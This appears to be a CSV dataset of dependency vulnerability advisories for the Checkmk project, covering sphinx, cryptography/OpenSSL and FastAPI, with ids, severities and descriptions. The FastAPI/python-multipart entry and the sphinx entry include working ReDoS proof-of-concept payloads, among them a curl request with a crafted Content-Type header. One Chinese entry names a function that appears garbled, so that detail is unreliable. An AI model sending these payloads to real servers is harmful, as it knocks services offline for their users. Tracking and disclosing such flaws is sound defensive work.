project,dependency,dependency_version,direct_dependency,cve_id,cwe_id,release_date,description,security_level_id,exploit_level_id
Checkmk_checkmk,sphinx,,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in google style docs, due to using an inefficient regex pattern with quantified overlapping adjacency.
## PoC
```
"" "" * 5000 + ""!""
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f00e75278c5999f40b214d8934357fbf0e705417)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8172)
- [Vulnerable Code](https://github.com/sphinx-doc/sphinx/blob/31f26a0bbf5e4e53b340e10464fc7c4cca96f12a/sphinx/ext/napoleon/docstring.py#L34)
",3,2
Checkmk_checkmk,pytest-xdist,,True,,CWE-362,2023-12-06,"## Overview
[pytest-xdist](https://pypi.org/project/pytest-xdist) is a pytest xdist plugin for distributed testing, most importantly across multiple CPUs

Affected versions of this package are vulnerable to Race Condition in the `looponfail` mode where a concurrent file removal could cause a crash.
## Remediation
Upgrade `pytest-xdist` to version 1.6 or higher.
## References
- [GitHub Commit](https://github.com/pytest-dev/pytest-xdist/commit/d9c5f18478db6d1d1584f53ce1b4c1c4feb43f9a)
",3,0
Checkmk_checkmk,cryptography,,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
Checkmk_checkmk,cryptography,,True,CVE-2016-9243,CWE-20,2016-11-01,"Cryptography是一个用于Python开发的加密工具包。HKDF是其中的一个基于HMAC的密钥导出函数。
Cryptography 1.5.2之前的版本中的HKDF存在安全漏洞。攻击者可利用该漏洞获取敏感信息的访问权限或绕过安全限制，执行未授权的操作。",2,2
Checkmk_checkmk,cryptography,,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
Checkmk_checkmk,cryptography,,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
Checkmk_checkmk,cryptography,,True,,CWE-415,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a malformed DSA private key. (related to CVE-2016-0705)

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 0.9.1 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#091---2015-06-06)
- [Github PR](https://github.com/pyca/cryptography/pull/2013)
- [Gtihub Commit](https://github.com/pyca/cryptography/commit/87c99a503a699f5c0296636237a9208fc161cc9e)
",2,2
Checkmk_checkmk,cryptography,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

The OpenSSL backend beffore 1.0.2 made use of assertions to check response where the tests could not trigger a failure. If a user ran Python with this -O flag and got an invalid response code this could lead to a crash.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 1.0.2 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#102---2015-09-27)
- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=1267548)
",3,2
Checkmk_checkmk,cryptography,,True,,CWE-222,2015-09-10,"## Overview
[`cryptography`](https://pypi.python.org/pypi/cryptography) provides cryptographic recipes and primitives to Python developers.

Affected versions of this package are vulnerable to TLS Truncation. A malicious user can prevent a user from fetching the parts of a message by inserting TCP code into a message indicating the message has completed.

## References
- [GitHub PR](https://github.com/pyca/cryptography/pull/2334)
- [GitHub Commit](https://github.com/pyca/cryptography/commit/41aabcbd2326ae154a16a1a050ee01fb9a54bd19)
",3,2
Checkmk_checkmk,cryptography,,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
Checkmk_checkmk,cryptography,,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
Checkmk_checkmk,cryptography,,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
Checkmk_checkmk,cryptography,,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
Checkmk_checkmk,cryptography,,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
Checkmk_checkmk,fastapi,,True,CVE-2021-32677,CWE-352,2021-06-09,"fastapi-utils是一个应用软件。可重用工具为FastAPI
fastapi-utils存在跨站请求伪造漏洞，该漏洞源于FastAPI 0.65.2版本及以下版本在接收浏览器发送的JSON负载的路径操作中使用cookie进行身份验证，容易受到跨站点请求伪造(CSRF)攻击。",2,2
Checkmk_checkmk,fastapi,,True,CVE-2024-24762,CWE-400 CWE-1333,,python-multipart是由个人开发者Marcelo Trylesinski开发的一个Python流式多部分解析器。该组件用于解析HTTP请求中的内容类型。此漏洞发生在版本0.0.7之前，攻击者可以通过发送特制的Content-Type头部，该头部使得正则表达式解析过程消耗过多的CPU资源，导致服务无法响应其他请求。此问题源于不当的正则表达式使用，造成灾难性回溯，进而使主事件循环无限期停止。,2,1
Checkmk_checkmk,fastapi,,True,,CWE-1333 CWE-400,2024-02-06,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-2jv5-9r88-3w3p. This link is maintained to preserve external references.

## Original Description

### Summary

When using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.

An attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.

This can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS

This only applies when the app uses form data, parsed with `python-multipart`.

### Details

A regular HTTP `Content-Type` header could look like:

```
Content-Type: text/html; charset=utf-8
```

`python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74

A custom option could be made and sent to the server to break it with:

```
Content-Type: application/x-www-form-urlencoded; !=\""\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
```

This is also reported to Starlette at: https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238

### PoC

Create a FastAPI app that uses form data:

```Python
# main.py
from typing import Annotated
from fastapi.responses import HTMLResponse
from fastapi import FastAPI,Form
from pydantic import BaseModel

class Item(BaseModel):
    username: str

app = FastAPI()

@app.get(""/"", response_class=HTMLResponse)
async def index():
    return HTMLResponse(""Test"", status_code=200)

@app.post(""/submit/"")
async def submit(username: Annotated[str, Form()]):
    return {""username"": username}

@app.post(""/submit_json/"")
async def submit_json(item: Item):
    return {""username"": item.username}
```

Then start it with:

```console
$ uvicorn main:app

INFO:     Started server process [50601]
INFO:     Waiting for application startup.
INFO:     ASGI 'lifespan' protocol appears unsupported.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)
```

Then send the attacking request with:

```console
$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\""\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'
```

#### Stopping it

Because that holds the main loop consuming the CPU non-stop, it's not possible to simply kill Uvicorn with `Ctrl+C` as it can't handle the signal.

To stop it, first check the process ID running Uvicorn:

```console
$ ps -fA | grep uvicorn

  501 59461 24785   0  4:28PM ttys004    0:00.13 /Users/user/code/starlette/env3.10/bin/python /Users/user/code/starlette/env3.10/bin/uvicorn redos_starlette:app
  501 59466 99935   0  4:28PM ttys010    0:00.00 grep uvicorn
```

In this case, the process ID was `59461`, then you can kill it (forcefully, with `-9`) with:

```console
$ kill -9 59461
```

### Impact

It's a ReDoS, (Regular expression Denial of Service), it only applies to those reading form data, using `python-multipart`. This way it also affects other libraries using Starlette, like FastAPI.

### Original Report

This was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r

<details>
<summary>Original report to FastAPI</summary>

Hey Tiangolo!

My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).

Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:

```Python
from typing import Annotated
from fastapi.responses import HTMLResponse
from fastapi import FastAPI,Form
from pydantic import BaseModel

class Item(BaseModel):
    username: str

app = FastAPI()

@app.get(""/"", response_class=HTMLResponse)
async def index():
    return HTMLResponse(""Test"", status_code=200)

@app.post(""/submit/"")
async def submit(username: Annotated[str, Form()]):
    return {""username"": username}

@app.post(""/submit_json/"")
async def submit_json(item: Item):
    return {""username"": item.username}
```

I'm running the above with uvicorn with the following command:

```console
uvicorn server:app
```

Then run the following cUrl command:

```
curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\""\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'
```

You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%

You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.

If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.

Cheers

#### Impact

An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.

#### Occurrences

[params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)

</details>",2,2
